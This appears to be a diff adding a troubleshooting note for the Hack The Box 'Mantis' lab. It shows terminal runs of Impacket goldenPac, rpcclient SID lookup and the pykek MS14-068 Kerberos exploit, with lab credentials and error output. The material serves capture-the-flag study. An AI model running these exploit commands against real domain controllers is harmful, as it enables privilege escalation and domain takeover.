@@ -1,0 +1,29 @@
+### Unknown issue
+https://blog.felixm.pw/mantis.html
+
+> If you receive an error like this: "mantis.htb.local seems not vulnerable (Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database))" Then you need to double check that you're using the correct FQDNs. Double check your Nmap scan as this should tell you the Domain Name and what the host's FQDN is.
+
+$ goldenPac htb.local/james:'J@m3s_P@ssW0rd!'@$ip              
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
+[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
+[*] Attacking domain controller mantis.htb.local
+[*] mantis.htb.local seems not vulnerable (Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database))
+
+$ rpcclient $ip -NU james%'J@m3s_P@ssW0rd!' -c 'lookupnames james'
+james S-1-5-21-4220043660-4019079961-2895681657-1103 (User: 1)
+
+$ python2 ms14-068.py -u james@htb.local -p 'J@m3s_P@ssW0rd!' -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d $ip
+Traceback (most recent call last):
+  File "ms14-068.py", line 178, in <module>
+    user_key = (RC4_HMAC, ntlm_hash(opts['-p']).digest())
+  File "/home/kali/tools/pykek/kek/crypto.py", line 65, in ntlm_hash
+    return MD4.new(pwd.encode('utf-16le'))
+  File "/home/kali/tools/pykek/kek/_crypto/MD4.py", line 4, in new
+    return hashlib.new('md4', *args)
+  File "/usr/lib/python2.7/hashlib.py", line 116, in __py_new
+    return __get_builtin_constructor(name)(string)
+  File "/usr/lib/python2.7/hashlib.py", line 97, in __get_builtin_constructor
+    raise ValueError('unsupported hash type ' + name)
+ValueError: unsupported hash type md4
